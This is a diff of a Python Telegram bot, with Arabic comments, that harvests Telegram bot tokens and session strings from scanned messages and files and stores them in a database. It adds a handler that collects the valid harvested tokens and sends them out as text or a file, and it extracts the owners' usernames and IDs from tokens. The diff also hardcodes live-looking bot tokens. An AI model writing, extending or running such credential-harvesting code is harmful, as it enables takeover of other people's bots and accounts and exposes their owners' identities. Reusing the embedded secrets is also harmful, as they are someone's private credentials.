@@ -861,7 +861,7 @@ async def process_message_chunk(bot, start_id, end_id, stats, seen_tokens, seen_
                                             'bot_info': {}
                                         }
                                         stats['tokens']['details'].append(token_data)
-                                        
+
                                         # حفظ التوكن مباشرة في قاعدة البيانات
                                         if user_id:
                                             try:
@@ -880,7 +880,7 @@ async def process_message_chunk(bot, start_id, end_id, stats, seen_tokens, seen_
                                             'source': 'file'
                                         }
                                         stats['sessions']['details'].append(session_data)
-                                        
+
                                         # حفظ الجلسة مباشرة في قاعدة البيانات
                                         if user_id:
                                             try:
@@ -3411,6 +3411,37 @@ async def main():
             except Exception as e:
                 await event.answer("❌ حصل خطأ: {}".format(str(e)))
 
+        elif data == 'send_tokens':
+            await event.answer("🔑 بدء جمع وإرسال التوكنات...")
+
+            try:
+                if 'analysis' not in user_state or 'tokens' not in user_state['analysis']:
+                    await event.answer("❌ ما فيش تحليل للتوكنات. جرب تاني")
+                    return
+
+                tokens_details = user_state['analysis']['tokens']['details']
+                valid_tokens = [token for token in tokens_details if token.get('valid', False)]
+
+                if valid_tokens:
+                    user_state['valid_tokens_list'] = valid_tokens
+                    await set_user_state(user_id, user_state)
+
+                    buttons = [
+                        [Button.inline("📝 إرسال التوكنات نصياً", "send_tokens_text_main")],
+                        [Button.inline("📁 إرسال التوكنات في ملف", "send_tokens_file_main")]
+                    ]
+
+                    await event.respond(
+                        f"🔑 تم العثور على {len(valid_tokens)} توكن صالح\n\n"
+                        f"اختر طريقة الإرسال:",
+                        buttons=buttons
+                    )
+                else:
+                    await event.answer("❌ ما لقيتش أي توكنات صالحة")
+
+            except Exception as e:
+                await event.answer("❌ حصل خطأ: {}".format(str(e)))
+
         elif data == 'broadcast':
             await event.answer("📢 بدء عملية الإذاعة...")
 
@@ -3778,27 +3809,27 @@ async def main():
         if user_state['step'] == 'waiting_owner_input':
             # التحقق من وجود توكن في النص
             token_match = TOKEN_PATTERN.search(text)
-            
+
             if not token_match:
                 await event.respond("❌ لم يتم العثور على توكن صالح في الرسالة")
                 return
-            
+
             token = token_match.group(0)
-            
+
             progress_msg = await event.respond("⏳ جاري تحليل البوت واستخراج معلومات المالك...")
-            
+
             try:
                 # تحليل التوكن واستخراج معلومات المالك
                 result = await analyze_token_with_owner(token, user_id, None)
-                
+
                 if not result:
                     await progress_msg.edit("❌ فشل تحليل التوكن")
                     await set_user_state(user_id, {'step': 'start'})
                     return
-                
+
                 bot_info = result.get('bot_info', {})
                 owner_info = result.get('owner_info', {})
-                
+
                 # إنشاء رسالة بالمعلومات
                 message = (
                     f"✅ **تم تحليل التوكن بنجاح**\n\n"
@@ -3812,14 +3843,14 @@ async def main():
                     f"├ اليوزر: {owner_info.get('username', 'غير معروف')}\n"
                     f"└ الآيدي: `{owner_info.get('user_id', 'غير معروف')}`"
                 )
-                
+
                 await progress_msg.edit(message, parse_mode='markdown')
                 await set_user_state(user_id, {'step': 'start'})
-                
+
             except Exception as e:
                 await progress_msg.edit(f"❌ حدث خطأ في التحليل: {str(e)}")
                 await set_user_state(user_id, {'step': 'start'})
-            
+
             return
 
         if user_state['step'] == 'waiting_token':
@@ -4203,7 +4234,7 @@ async def main():
                 await progress_msg.edit(f"❌ حصل خطأ في الإذاعة الشبكية: {str(e)}")
 
     print("Starting bot...")
-    await bot.start(bot_token='8242278557:AAHhKIbCQNtt5V3kPxLc7UgCzsCIa40GGXo')
+    await bot.start(bot_token='6555119947:AAHpyZrbJxl94SXB8rjOa3AfNqvsOvW42aA')
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
